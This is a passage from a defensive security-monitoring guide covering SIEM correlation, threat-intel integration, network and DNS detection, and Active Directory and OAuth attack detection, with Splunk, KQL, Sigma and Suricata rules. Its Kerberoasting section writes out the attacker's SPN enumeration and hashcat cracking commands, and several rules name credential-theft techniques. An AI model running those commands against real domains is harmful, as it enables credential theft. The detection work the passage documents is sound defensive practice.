6. **Detection retirement** -- Remove rules that have not produced a true positive in 90+ days

### 2.6 Log Correlation Techniques

#### Temporal Correlation

Events occurring within a defined time window that together indicate malicious activity:

```
Example: Credential stuffing followed by data access

T+0:00  Multiple failed logins (EventID 4625) from IP 203.0.113.50
T+0:03  Successful login (EventID 4624) for user "admin_svc"
T+0:04  Abnormal file share access (EventID 5140) to \\fileserver\finance
T+0:06  Large file copy detected (EventID 5145, high byte count)

Correlation rule (SPL/Splunk):
  index=wineventlog EventCode=4625
  | stats count as fail_count by src_ip
  | where fail_count > 5
  | join src_ip [search index=wineventlog EventCode=4624]
  | join user [search index=wineventlog EventCode=5140
    | where share_name="\\\\*\\finance*"]
  | where _time_4624 - _time_4625 < 300
```

#### Entity Correlation

Linking events across data sources by shared entities (user, host, IP):

```
Example: Account compromise timeline (entity = user "jsmith")

Source: Auth logs    -> Failed MFA attempt from unusual country
Source: Email logs   -> Inbox rule created to forward emails
Source: Cloud audit  -> New OAuth app consent granted
Source: Endpoint     -> PowerShell download cradle executed
Source: DNS logs     -> Queries to newly registered domain
Source: Flow data    -> Large outbound transfer to cloud storage

All correlated by entity: user="jsmith"
```

#### Kill Chain Correlation

Events mapped to sequential kill chain stages:

```
Example: Full attack progression

Stage 3 (Delivery):    Phishing email delivered (email gateway log)
Stage 4 (Exploitation): Macro execution (Sysmon EID 1, parent=WINWORD.EXE)
Stage 5 (Installation): Scheduled task created (Sysmon EID 11, EID 12)
Stage 6 (C2):           DNS beaconing to DGA domain (DNS log)
Stage 7 (Actions):      LSASS memory dump (Sysmon EID 10, target=lsass.exe)

Correlation rule: Alert when events match 3+ kill chain stages
                  involving the same host within 24 hours
```

### 2.7 Indicators of Compromise (IoC) vs. Indicators of Attack (IoA)

| Dimension | IoC (Indicators of Compromise) | IoA (Indicators of Attack) |
|---|---|---|
| **Definition** | Forensic evidence that a breach has occurred | Behavioral patterns indicating an active attack |
| **Nature** | Static, signature-based | Dynamic, behavior-based |
| **Timing** | After the fact (reactive) | During the attack (proactive) |
| **Examples** | Known malware hashes, C2 IP addresses, malicious domains | Unusual process parent-child relationships, beaconing patterns, privilege escalation sequences |
| **Durability** | Short-lived (attackers change infrastructure) | Long-lived (TTPs are harder to change) |
| **Detection** | Hash matching, IP/domain blocklists, YARA rules | Behavioral analytics, process tree analysis, statistical anomaly detection |
| **ATT&CK mapping** | Maps to specific indicators | Maps to techniques and tactics |

**Pyramid of Pain (David Bianco):**
```
                      /  TTPs  \           <-- Hardest for attacker to change
                     / Procedures\             (IoA territory)
                    /   Tools     \
                   / Network/Host  \
                  /  Artifacts      \       <-- IoA + IoC overlap
                 /  Domain Names     \
                /   IP Addresses      \    <-- IoC territory
               /    Hash Values        \   <-- Easiest to change (trivial)
```

### 2.8 Threat Intelligence Integration

#### STIX/TAXII

**STIX** (Structured Threat Information eXpression) is a language for describing cyber threat information. STIX 2.1 defines 18 Domain Objects:

| Object Type | Purpose | Example |
|---|---|---|
| Attack Pattern | Describes a TTP | ATT&CK technique mapping |
| Campaign | Related intrusion activity | "Operation Aurora" |
| Indicator | Pattern indicating malicious activity | `[file:hashes.SHA-256 = 'abc123...']` |
| Malware | Malicious software | "Cobalt Strike Beacon" |
| Threat Actor | Adversary identity | "APT29 / Cozy Bear" |
| Vulnerability | CVE or weakness | "CVE-2024-21887" |
| Relationship | Links between objects | "Threat Actor uses Malware" |
| Sighting | Instance of observed indicator | "Indicator seen on host X at time Y" |

**TAXII** (Trusted Automated eXchange of Intelligence Information) is the transport protocol for STIX:

```
TAXII 2.1 API Endpoints:
GET  /taxii2/                          # Server discovery
GET  /taxii2/collections/              # List collections
GET  /taxii2/collections/{id}/objects/ # Get STIX objects
POST /taxii2/collections/{id}/objects/ # Submit STIX objects
```

**Integration architecture:**
```
+---------------+    TAXII    +---------------+   Enrichment  +-----------+
| Threat Intel  |------------>|     MISP      |-------------->|   SIEM    |
| Providers     |  (pull/push)|   (TIP hub)   | (IoC lookup)  | Detection |
|               |             |               |               |  Engine   |
| - AlienVault  |             | - Correlates  |               |           |
| - MITRE       |             | - Enriches    |               | Sigma     |
| - ISACs       |             | - Exports     |               | rules +   |
| - Commercial  |             | - STIX 2.1    |               | IoC match |
+---------------+             +---------------+               +-----------+
```

**MISP integration example (Python):**
```python
from pymisp import PyMISP

# Connect to MISP instance
misp = PyMISP(
    url='https://misp.internal.corp',
    key='YOUR_MISP_API_KEY',
    ssl=True
)

# Search for indicators related to a specific threat actor
results = misp.search(
    controller='attributes',
    type_attribute=['ip-dst', 'domain', 'sha256'],
    tags=['apt29', 'cozy-bear'],
    last='30d',
    pythonify=True
)

# Export as STIX 2.1 for SIEM ingestion
stix_bundle = misp.search(
    return_format='stix2',
    tags=['apt29'],
    last='7d'
)

# Publish to TAXII server
from taxii2client import Collection
collection = Collection(
    'https://taxii.internal.corp/collections/threat-intel/',
    user='taxii_user', password='taxii_pass'
)
collection.add_objects(stix_bundle)
```

---

## 3. Network Security Observability

### 3.1 Network Detection and Response (NDR)

NDR provides visibility into network traffic through deep packet inspection (DPI), flow analysis, and protocol analysis:

```
                    Network Detection Stack
+----------------------------------------------------+
|                  Analytics Layer                     |
|  +-----------+ +-----------+ +-------------------+  |
|  |ML Anomaly | |Behavioral | |Threat Intel       |  |
|  |Detection  | |Analytics  | |Correlation        |  |
|  +-----------+ +-----------+ +-------------------+  |
+----------------------------------------------------+
|                  Processing Layer                    |
|  +-----------+ +-----------+ +-------------------+  |
|  |Protocol   | |Flow       | |Metadata           |  |
|  |Decoding   | |Assembly   | |Extraction         |  |
|  +-----------+ +-----------+ +-------------------+  |
+----------------------------------------------------+
|                  Collection Layer                    |
|  +-----------+ +-----------+ +-------------------+  |
|  |Packet     | |NetFlow/   | |DNS/HTTP/TLS       |  |
|  |Capture    | |IPFIX      | |Transaction Logs   |  |
|  |(PCAP)     | |sFlow      | |                   |  |
|  +-----------+ +-----------+ +-------------------+  |
+----------------------------------------------------+
```

**NDR data sources and their security value:**

| Data Source | Granularity | Retention | Security Use Cases |
|---|---|---|---|
| Full packet capture (PCAP) | Highest | Days (expensive) | Forensic investigation, payload analysis, protocol reversing |
| NetFlow/IPFIX | Medium (flow metadata) | Weeks-months | Lateral movement, beaconing, data volume anomalies, baseline |
| sFlow | Sampled (1:N packets) | Weeks-months | Large-scale traffic analysis, DDoS detection |
| Zeek logs | Transaction-level | Months | Protocol analysis, file extraction, TLS monitoring, DNS analysis |
| Suricata EVE JSON | Alert + metadata | Months | Signature-based detection, protocol anomaly alerts |

### 3.2 DNS Monitoring

DNS is one of the most valuable data sources for security observability because nearly all network communication begins with a DNS query, and attackers heavily abuse DNS for C2, tunneling, and reconnaissance.

#### DNS Tunneling Detection

DNS tunneling encodes data in DNS queries/responses to bypass firewalls. Detection signals:

| Signal | Normal | Tunneling Indicator | Detection Method |
|---|---|---|---|
| Query length | < 30 chars avg. | > 50 chars avg., high entropy | Statistical analysis |
| Query volume per domain | < 10/min | > 100/min to single domain | Rate-based |
| Record types | A, AAAA dominant | Excessive TXT, NULL, MX | Type distribution analysis |
| Subdomain depth | 1-3 levels | 5+ levels with random strings | Depth counting |
| Query entropy | Low (readable words) | High (base32/64 encoded data) | Shannon entropy calculation |
| Response size | < 512 bytes typically | Consistently large responses | Size anomaly |

**DNS tunneling detection query (Splunk):**
```spl
index=dns sourcetype=dns
| eval query_length=len(query)
| eval subdomain_count=mvcount(split(query, ".")) - 2
| eval query_entropy=entropy(query)
| stats count as query_count, avg(query_length) as avg_len,
        avg(query_entropy) as avg_entropy,
        dc(query) as unique_queries
  by src_ip, parent_domain
| where query_count > 100 AND avg_len > 50
        AND avg_entropy > 3.5 AND unique_queries > 50
| sort -query_count
```

#### DGA (Domain Generation Algorithm) Detection

DGAs generate pseudo-random domain names for C2 infrastructure. Detection approaches:

```python
# DGA detection using character frequency analysis
import math
from collections import Counter

def calculate_entropy(domain):
    """Calculate Shannon entropy of domain name."""
    freq = Counter(domain)
    length = len(domain)
    entropy = -sum(
        (count/length) * math.log2(count/length)
        for count in freq.values()
    )
    return entropy

def detect_dga(domain):
    """Simple DGA detection heuristic."""
    parts = domain.split('.')
    sld = parts[0] if len(parts) >= 2 else domain

    signals = {
        'entropy': calculate_entropy(sld),
        'length': len(sld),
        'digit_ratio': sum(c.isdigit() for c in sld) / max(len(sld), 1),
        'consonant_ratio': sum(
            c in 'bcdfghjklmnpqrstvwxyz' for c in sld.lower()
        ) / max(len(sld), 1),
    }

    # Score-based classification
    score = 0
    if signals['entropy'] > 3.5: score += 30
    if signals['length'] > 15: score += 20
    if signals['digit_ratio'] > 0.3: score += 20
    if signals['consonant_ratio'] > 0.7: score += 20

    return {
        'domain': domain,
        'dga_score': score,
        'is_suspicious': score >= 60,
        'signals': signals
    }

# Examples:
# detect_dga('google.com')        -> Low score (~10)
# detect_dga('xkcd8f3j2m9q.net')  -> High score (80+)
```

#### DNS over HTTPS (DoH) Monitoring

DoH encrypts DNS queries, making traditional DNS monitoring blind. Detection strategies:

| Strategy | Method | Limitation |
|---|---|---|
| Block known DoH resolvers | IP blocklist (1.1.1.1, 8.8.8.8 on port 443) | Easy to bypass with custom resolvers |
| Enterprise DNS enforcement | Force all DNS through internal resolver, block external DNS | Requires network policy enforcement |
| TLS fingerprinting | JA3/JA4 fingerprints of DoH clients differ from browsers | Sophisticated attackers can mimic browser TLS |
| Traffic analysis | DoH has distinct traffic patterns (frequent small HTTPS requests) | High false-positive potential |
| Endpoint monitoring | Monitor process DNS API calls before encryption | Requires EDR on all endpoints |

### 3.3 NetFlow/IPFIX/sFlow Collection and Analysis

**Comparison of flow protocols:**

| Feature | NetFlow v5 | NetFlow v9 | IPFIX | sFlow |
|---|---|---|---|---|
| Template-based | No | Yes | Yes | N/A (sampled) |
| IPv6 support | No | Yes | Yes | Yes |
| MPLS support | No | Yes | Yes | Limited |
| Application info | No | NBAR | Yes | Yes |
| Sampling | Fixed | Configurable | Configurable | Always sampled |
| Standard | Cisco proprietary | Cisco | IETF RFC 7011 | RFC 3176 |

**Key flow-based detection use cases:**

```
1. Beaconing Detection (C2 Communication)
   Pattern: Regular interval connections to same external IP
   Query: Group flows by (src_ip, dst_ip, dst_port)
          Calculate inter-arrival time standard deviation
          Flag if std_dev < 5 seconds over 1 hour window

2. Data Exfiltration
   Pattern: Abnormal outbound data volume
   Query: Sum bytes_out by src_ip per hour
          Compare to 30-day rolling average
          Alert if current > 3x standard deviation

3. Lateral Movement (East-West)
   Pattern: Internal host contacting many internal hosts on admin ports
   Query: Count distinct dst_ip by src_ip
          where dst_port IN (445, 3389, 22, 5985)
          Alert if count > 10 distinct destinations in 1 hour

4. Port Scanning
   Pattern: Single source contacting many ports on single destination
   Query: Count distinct dst_port by (src_ip, dst_ip) in 5-minute window
          Alert if distinct ports > 100
```

**OpenTelemetry Collector flow ingestion (NetFlow):**
```yaml
receivers:
  netflow:
    endpoint: 0.0.0.0:2055
    protocols:
      - netflow_v5
      - netflow_v9
      - ipfix
    workers: 4

processors:
  transform/flows:
    log_statements:
      - context: log
        statements:
          - set(attributes["flow.direction"], "inbound")
            where attributes["flow.dst_ip"] == "10.0.0.0/8"
          - set(severity_text, "WARN")
            where attributes["flow.bytes"] > 1000000000

exporters:
  elasticsearch:
    endpoints: ["https://elastic.internal:9200"]
    logs_index: "network-flows"

service:
  pipelines:
    logs:
      receivers: [netflow]
      processors: [transform/flows]
      exporters: [elasticsearch]
```

### 3.4 East-West Traffic Monitoring (Lateral Movement Detection)

East-west traffic (internal-to-internal) is where attackers move laterally after initial compromise. Traditional perimeter tools miss this entirely.

**Lateral movement indicators:**

| Indicator | Data Source | Detection Logic |
|---|---|---|
| SMB/CIFS to multiple hosts | Flow data, Zeek smb.log | src contacts > 5 internal hosts on 445/TCP in 1 hour |
| RDP from non-admin workstation | Flow data, Windows EID 4624 type 10 | RDP (3389) from host not in admin subnet |
| WMI remote execution | Sysmon EID 1 (wmiprvse.exe), flow data | WMI (135/TCP) from unexpected sources |
| PsExec-like service creation | Windows EID 7045, Zeek dce_rpc.log | Service installation on remote hosts |
| SSH lateral pivot | Flow data, auth.log | SSH connections chaining through multiple internal hosts |
| Pass-the-Hash/Ticket | Windows EID 4624 (NTLM type 3), EID 4768 | Logon from unexpected hosts for privileged accounts |

**Detection rule -- unusual internal scanning:**
```yaml
# Sigma rule: Internal Network Reconnaissance
title: Internal Port Scan Detected
id: e5f6a7b8-9012-3456-efab-345678901234
status: stable
description: |
    Detects an internal host scanning multiple internal hosts on
    common administrative ports, indicating potential lateral movement
    reconnaissance.
tags:
    - attack.discovery
    - attack.t1046
    - attack.lateral_movement
logsource:
    category: firewall
detection:
    selection:
        dst_port:
            - 22     # SSH
            - 135    # RPC
            - 445    # SMB
            - 3389   # RDP
            - 5985   # WinRM HTTP
            - 5986   # WinRM HTTPS
        src_ip|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
            - '192.168.0.0/16'
        dst_ip|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
            - '192.168.0.0/16'
    timeframe: 1h
    condition: selection | count(dst_ip) by src_ip > 10
falsepositives:
    - Vulnerability scanners (Nessus, Qualys)
    - IT asset discovery tools
    - Network monitoring systems
level: high
```

### 3.5 TLS/SSL Inspection and Certificate Monitoring

**Certificate monitoring signals:**

| Signal | Risk | Detection |
|---|---|---|
| Self-signed certs on external connections | C2 communication | Alert on self-signed certs not in allow-list |
| Certificates with very long validity (> 1 year) | Persistence infrastructure | Certificate field analysis |
| Certificates from free CAs to suspicious domains | Phishing, C2 | Correlate with domain age and reputation |
| Certificate transparency log anomalies | Domain impersonation | Monitor CT logs for your domains |
| Expired certificates | Misconfiguration / abandoned infra | Certificate expiry monitoring |
| Wildcard certificates in unexpected locations | Potential compromise | Inventory wildcard cert deployment |

### 3.6 Encrypted Traffic Analysis: JA3/JA3S and JA4+

**JA3 (TLS Client Fingerprinting):**
JA3 generates an MD5 hash from the TLS Client Hello fields: SSL version, accepted ciphers, list of extensions, elliptic curves, and elliptic curve point formats.

**JA4+ (Next Generation, 2023+):**
JA4 improves on JA3 with human-readable, structured fingerprints using an `a_b_c` format:

```
JA3 example:  769,47-53-5-10-49161-49162-...,0-10-11,23-24-25,0
JA3 hash:     e7d705a3286e19ea42f587b344ee6865  (opaque MD5)

JA4 example:  t13d1516h2_8daaf6152771_e5627efa2ab1  (human-readable)
              |  |  |  |
              |  |  |  +-- h2 = ALPN (HTTP/2)
              |  |  +---- 1516 = 15 cipher suites, 16 extensions
              |  +------- d = domain SNI present
              +--------- t13 = TLS 1.3
```

**JA4+ suite components:**

| Fingerprint | What it captures | Security Use |
|---|---|---|
| JA4 | TLS Client Hello | Identify client applications, detect malware families |
| JA4S | TLS Server Hello | Identify server configurations |
| JA4H | HTTP Client | HTTP client fingerprinting (headers, methods) |
| JA4L | Light distance / latency | Network hop analysis |
| JA4X | X.509 certificate | Certificate pattern matching |
| JA4SSH | SSH | SSH client/server fingerprinting |

**Known malware JA3/JA4 fingerprints (examples):**
```
Cobalt Strike Beacon:
  JA3:  72a589da586844d7f0818ce684948eea
  JA3:  a0e9f5d64349fb13191bc781f81f42e1

Metasploit Meterpreter:
  JA3:  5d65ea3fb1d4aa7d826733d2f2cbbb1d

Trickbot:
  JA3:  6734f37431670b3ab4292b8f60f29984

Detection query (Zeek + Elasticsearch):
  ja3.hash: ("72a589da586844d7f0818ce684948eea" OR
             "a0e9f5d64349fb13191bc781f81f42e1")
```

### 3.7 Zeek (formerly Bro) Network Security Monitor

Zeek passively monitors network traffic and generates structured, transaction-level logs.

**Key Zeek log types:**

| Log File | Content | Security Use Cases |
|---|---|---|
| `conn.log` | Connection metadata (IPs, ports, duration, bytes) | Baseline traffic, beaconing, lateral movement |
| `dns.log` | DNS queries and responses | Tunneling, DGA, C2 domain resolution |
| `http.log` | HTTP requests and responses | Malware delivery, C2 callbacks, web attacks |
| `ssl.log` | TLS handshake details, certificate info | JA3 fingerprinting, certificate anomalies |
| `files.log` | File transfers across protocols | Malware file detection, data exfiltration |
| `x509.log` | X.509 certificate details | Certificate analysis, impersonation detection |
| `notice.log` | Zeek-generated alerts | Policy violations, anomalies |
| `intel.log` | Threat intelligence matches | IoC hits from loaded intel feeds |
| `pe.log` | Portable Executable metadata | Windows malware analysis |
| `smtp.log` | SMTP transaction details | Phishing email analysis |
| `ssh.log` | SSH connection details | Brute force, unauthorized access |
| `kerberos.log` | Kerberos authentication | Kerberoasting, ticket anomalies |
| `dce_rpc.log` | DCE/RPC calls | Lateral movement (PsExec, WMI) |
| `smb_files.log` | SMB file access | Lateral movement, ransomware |
| `rdp.log` | RDP connection metadata | Lateral movement, unauthorized remote access |

**Zeek intel framework configuration:**
```zeek
# Load threat intel indicators
@load frameworks/intel/seen
@load frameworks/intel/do_notice

redef Intel::read_files += {
    "/opt/zeek/share/zeek/intel/threat_ips.dat",
    "/opt/zeek/share/zeek/intel/malware_hashes.dat",
    "/opt/zeek/share/zeek/intel/c2_domains.dat",
};

# Intel indicator file format (tab-separated):
# indicator    indicator_type    meta.source    meta.desc
# 203.0.113.50    Intel::ADDR    AlienVault    Known C2 server
# evil.example.com    Intel::DOMAIN    MISP    Phishing domain
# abc123def456...    Intel::FILE_HASH    VirusTotal    Ransomware payload
```

### 3.8 Suricata IDS/IPS

Suricata provides signature-based and protocol-anomaly detection with EVE JSON output.

**Suricata rule syntax:**
```
action protocol src_ip src_port -> dst_ip dst_port (rule options)
```

**Example rules:**

```
# Detect potential C2 beaconing (HTTP)
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"OLLYSTACK Potential C2 Beaconing - Regular Interval HTTP";
    flow:established,to_server;
    http.method; content:"GET";
    http.uri; content:"/api/check";
    threshold:type both, track by_src, count 10, seconds 300;
    classtype:trojan-activity;
    sid:1000001; rev:1;
)

# Detect DNS tunneling (long query names)
alert dns $HOME_NET any -> any any (
    msg:"OLLYSTACK DNS Tunneling - Abnormally Long DNS Query";
    dns.query; content:"."; pcre:"/^[a-z0-9]{30,}\./i";
    threshold:type both, track by_src, count 5, seconds 60;
    classtype:bad-unknown;
    sid:1000002; rev:1;
)

# Detect Kerberoasting (TGS request for suspicious SPN)
alert krb5 $HOME_NET any -> $HOME_NET any (
    msg:"OLLYSTACK Potential Kerberoasting - RC4 TGS Request";
    krb5.msgtype; content:"|0d|";
    krb5.encryption_type; content:"|17|";
    threshold:type both, track by_src, count 5, seconds 300;
    classtype:credential-access;
    sid:1000003; rev:1;
)
```

**Suricata EVE JSON output configuration:**
```yaml
# /etc/suricata/suricata.yaml (outputs section)
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert:
            payload: yes
            payload-printable: yes
            packet: yes
            metadata: yes
        - dns:
            query: yes
            answer: yes
        - http:
            extended: yes
        - tls:
            extended: yes
            session-resumption: yes
            ja3: yes
            ja4: yes
        - files:
            force-magic: yes
            force-hash: [md5, sha256]
        - flow
        - netflow
        - smtp:
            extended: yes
        - ssh
```

### 3.9 Network Segmentation Monitoring

**Microsegmentation verification through observability:**

```
Verification Strategy:
1. Baseline allowed flows from policy (expected)
2. Monitor actual flows from NetFlow/Zeek (observed)
3. Compare expected vs. observed
4. Alert on policy violations (unauthorized cross-segment traffic)

Example: Verify PCI DSS segmentation

Expected (per policy):
  +----------+     +----------+
  | PCI Zone |---->| Payment  |  Only ports 443, 8443 allowed
  | (VLAN10) |     | Gateway  |
  +----------+     +----------+
       |
       X (no direct access to)
       |
  +----------+
  | Corp Net |
  | (VLAN20) |
  +----------+

Detection rule:
  IF src_ip IN pci_zone AND dst_ip IN corp_zone
  THEN alert("PCI segmentation violation")

  IF src_ip IN pci_zone AND dst_ip IN pci_zone
     AND dst_port NOT IN [443, 8443]
  THEN alert("Unauthorized port in PCI zone")
```

**NDR and microsegmentation integration (2025 best practice):**
- 77% of cybersecurity leaders monitor east-west traffic (Gartner 2025)
- 40% of east-west data still lacks context needed for effective detection
- Recommended: Combine NDR for visibility with microsegmentation for enforcement
- Start with NDR to map network activity, then implement microsegmentation for critical assets

---

## 4. Identity and Access Monitoring

### 4.1 Authentication Observability

**Key Windows Security Event IDs for authentication:**

| Event ID | Description | Security Significance |
|---|---|---|
| 4624 | Successful logon | Baseline normal access, detect anomalous logon types |
| 4625 | Failed logon | Brute force, password spraying, credential stuffing |
| 4648 | Logon using explicit credentials | RunAs, credential relay attacks |
| 4768 | Kerberos TGT requested (AS-REQ) | Initial authentication, detect unusual ticket requests |
| 4769 | Kerberos service ticket requested (TGS-REQ) | Kerberoasting detection (RC4 encryption) |
| 4771 | Kerberos pre-authentication failed | Password attacks against Kerberos |
| 4776 | NTLM authentication (credential validation) | Pass-the-Hash, NTLM relay detection |

**Logon Type reference:**

| Type | Name | Significance |
|---|---|---|
| 2 | Interactive | Local console logon |
| 3 | Network | SMB, mapped drives -- common in lateral movement |
| 4 | Batch | Scheduled tasks |
| 5 | Service | Service startup |
| 7 | Unlock | Workstation unlock |
| 8 | NetworkCleartext | IIS basic auth -- credentials in cleartext |
| 9 | NewCredentials | RunAs /netonly |
| 10 | RemoteInteractive | RDP -- lateral movement indicator |
| 11 | CachedInteractive | Domain controller unreachable, cached creds |

**Impossible travel detection logic:**
```python
from math import radians, cos, sin, asin, sqrt
from datetime import datetime

def haversine(lat1, lon1, lat2, lon2):
    """Calculate distance in km between two GPS coordinates."""
    lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    return 2 * 6371 * asin(sqrt(a))

def detect_impossible_travel(events):
    """
    Detect impossible travel: user authenticating from two locations
    faster than physically possible.
    events: list of {user, timestamp, lat, lon, city, country}
    """
    MAX_TRAVEL_SPEED_KMH = 900  # Max commercial flight speed

    alerts = []
    user_events = {}
    for e in events:
        user_events.setdefault(e['user'], []).append(e)

    for user, user_evts in user_events.items():
        user_evts.sort(key=lambda x: x['timestamp'])
        for i in range(1, len(user_evts)):
            prev, curr = user_evts[i-1], user_evts[i]
            distance_km = haversine(
                prev['lat'], prev['lon'],
                curr['lat'], curr['lon']
            )
            time_diff_hours = (
                curr['timestamp'] - prev['timestamp']
            ).total_seconds() / 3600

            if time_diff_hours > 0:
                required_speed = distance_km / time_diff_hours
                if required_speed > MAX_TRAVEL_SPEED_KMH:
                    alerts.append({
                        'user': user,
                        'from': f"{prev['city']}, {prev['country']}",
                        'to': f"{curr['city']}, {curr['country']}",
                        'distance_km': round(distance_km),
                        'time_diff_min': round(time_diff_hours * 60),
                        'required_speed_kmh': round(required_speed),
                        'severity': 'critical'
                            if distance_km > 5000 else 'high'
                    })
    return alerts
```

### 4.2 Active Directory / Entra ID Attack Detection

#### Kerberoasting Detection

Kerberoasting targets service accounts by requesting TGS tickets encrypted with the service account password hash, then cracking them offline.

```
Attack flow:
1. Attacker enumerates SPNs:  setspn -T corp.local -Q */*
2. Requests TGS for each SPN: (Kerberos TGS-REQ)
3. Extracts ticket:           Export from memory
4. Cracks offline:            hashcat -m 13100 tickets.txt wordlist.txt

Detection signals:
- EventID 4769 with EncryptionType = 0x17 (RC4-HMAC)
  (RC4 is weaker and preferred by attack tools)
- High volume of TGS requests from single source
- TGS requests for unusual SPNs
- TGS requests from non-service accounts
```

**Sigma rule -- Kerberoasting:**
```yaml
title: Potential Kerberoasting - RC4 TGS Requests
id: f5a6b7c8-0123-4567-abcd-567890123456
status: stable
description: |
    Detects potential Kerberoasting by identifying TGS requests using
    RC4-HMAC encryption (etype 0x17), which is preferred by attack
    tools like Rubeus and Invoke-Kerberoast because RC4 tickets are
    faster to crack than AES tickets.
references:
    - https://attack.mitre.org/techniques/T1558/003/
author: OllyStack Security Research
date: 2025/01/15
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter_machine_accounts:
        ServiceName|endswith: '$'
    filter_known_services:
        ServiceName:
            - 'krbtgt'
            - 'kadmin'
    condition: selection and not filter_machine_accounts
              and not filter_known_services
falsepositives:
    - Older systems that only support RC4
    - Legacy applications
level: high
```

**Mitigation**: Migrate service accounts to Group Managed Service Accounts (gMSA). Disable RC4 encryption for Kerberos (disabled by default in Windows Server 2025). Regularly audit and remove unused SPNs.

#### Golden Ticket Attack Detection

Golden Ticket attacks forge TGTs using the stolen KRBTGT hash:

```
Detection signals:
- EventID 4768 (TGT request) with unusual properties:
  - Account that doesn't exist in AD
  - Ticket lifetime exceeding domain policy (e.g., >10 hours)
  - Encryption type mismatch
- EventID 4769 without corresponding 4768
  (ticket used without TGT request)
- Logon from a domain that doesn't match (SID history mismatch)

Mitigation:
- Change KRBTGT password every 12 months minimum
- Change immediately after any suspected compromise
- Must change TWICE (due to password history of 2)
```

#### DCSync Attack Detection

DCSync uses the MS-DRSR protocol to request password hashes from a domain controller:

```yaml
title: Potential DCSync Attack
id: a6b7c8d9-1234-5678-bcde-678901234567
status: stable
description: |
    Detects potential DCSync attack by monitoring for directory
    replication requests (GetNCChanges) from non-domain controller
    sources, indicating mimikatz or similar tools replicating AD
    credentials.
references:
    - https://attack.mitre.org/techniques/T1003/006/
tags:
    - attack.credential_access
    - attack.t1003.006
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        AccessMask: '0x100'
        Properties|contains:
            # DS-Replication-Get-Changes
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
            # DS-Replication-Get-Changes-All
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
            # DS-Replication-Get-Changes-In-Filtered-Set
            - '89e95b76-444d-4c62-991a-0facbeda640c'
    filter_dc:
        SubjectUserName|endswith: '$'
    condition: selection and not filter_dc
falsepositives:
    - Azure AD Connect sync accounts
    - Legitimate replication monitoring tools
level: critical
```

#### Pass-the-Hash Detection

```
Detection signals:
- EventID 4624 with LogonType=3 (Network) and AuthPackage=NTLM
  from workstations (not servers)
- NTLM authentication where source workstation doesn't match
  the account's normal workstation
- EventID 4776 (NTLM validation) with unexpected source computers

Sigma rule fragment:
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
        WorkstationName|not endswith: 'SRV'
    filter_known:
        IpAddress|cidr: '10.1.100.0/24'  # Known admin subnet
    condition: selection and not filter_known
```

### 4.3 OAuth/OIDC Token Monitoring

**Token-based attack patterns (2025):**

| Attack | Description | Detection Signal |
|---|---|---|
| **Token theft** | Stealing access/refresh tokens from browser storage, memory, or logs | Token used from IP/device that doesn't match issuance context |
| **Refresh token abuse** | Using stolen refresh tokens to mint new access tokens indefinitely | Refresh token used after long dormancy, from new IP/device |
| **Consent phishing** | Tricking user into granting OAuth permissions to malicious app | OAuth consent grant to previously unseen app with high-privilege scopes |
| **Device code phishing** | Abusing OAuth device code flow to steal tokens | Device code auth flow completed from unexpected locations |
| **Token replay** | Replaying captured tokens against APIs | Same token used from multiple IP addresses simultaneously |

**2025 notable incidents**: The Salesloft-Drift campaign hit 700+ organizations including Cloudflare, Palo Alto Networks, and Zscaler by compromising OAuth tokens. Attackers replayed valid OAuth tokens to authenticate directly into hundreds of Salesforce environments, bypassing MFA.

**Detection queries (Microsoft Entra ID / Azure AD):**

```kql
// Detect suspicious OAuth app consent (Microsoft Sentinel KQL)
AuditLogs
| where OperationName == "Consent to application"
| extend AppName = tostring(TargetResources[0].displayName)
| extend Scopes = tostring(
    TargetResources[0].modifiedProperties[0].newValue)
| where Scopes has_any ("Mail.Read", "Files.ReadWrite.All",
                         "Directory.ReadWrite.All",
                         "User.ReadWrite.All")
| extend InitiatedBy = tostring(
    InitiatedBy.user.userPrincipalName)
| project TimeGenerated, InitiatedBy, AppName, Scopes
| sort by TimeGenerated desc

// Detect token replay from multiple IPs
SigninLogs
| where TimeGenerated > ago(1h)
| summarize IPCount = dcount(IPAddress),
            IPs = make_set(IPAddress),
            Countries = make_set(
                LocationDetails.countryOrRegion)
  by UserPrincipalName, AppDisplayName, TokenIssuerType
| where IPCount > 3
| where array_length(Countries) > 1

// Detect OAuth device code phishing
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| where ResultType == 0  // Successful
| project TimeGenerated, UserPrincipalName, IPAddress,
          Location, AppDisplayName
| join kind=anti (
    SigninLogs
    | where TimeGenerated > ago(30d)
    | where AuthenticationProtocol == "deviceCode"
    | summarize by UserPrincipalName
  ) on UserPrincipalName
// Shows device code flows for users who have never used them
```

### 4.4 Service Account Monitoring

**Service account risk signals:**

| Risk | Detection | Remediation |
|---|---|---|
| Static passwords never rotated | Check `pwdLastSet` > 365 days | Migrate to gMSA |
| Excessive permissions | Enumerate group memberships | Principle of least privilege audit |
| Interactive logon | EID 4624 type 2/10 for service accounts | Block interactive logon via policy |
| Anomalous usage patterns | Usage outside normal hours/hosts | UEBA baseline for service accounts |
| Clear-text credentials in code | Scan repos, scripts, configs | Vault integration, managed identities |

### 4.5 Privileged Access Management (PAM) Observability

**PAM telemetry signals:**

| Signal | Source | Detection Use |
|---|---|---|
| Session recording | PAM vault (CyberArk, BeyondTrust) | Post-incident forensics, policy compliance |
| Command logging | SSH session proxies, jump servers | Detect unauthorized commands by privileged users |
| Credential checkout | PAM audit logs | Detect unusual checkout patterns, off-hours access |
| Password rotation failures | PAM system events | Identify accounts with stale privileged credentials |
| Break-glass usage | Emergency access logs | Ensure all emergency access is justified and reviewed |

### 4.6 User and Entity Behavior Analytics (UEBA)

**Baseline establishment:**
```
Behavioral dimensions for user baseline:
+-- Authentication patterns
|   +-- Normal login times (e.g., 8am-6pm weekdays)
|   +-- Normal source IPs / subnets
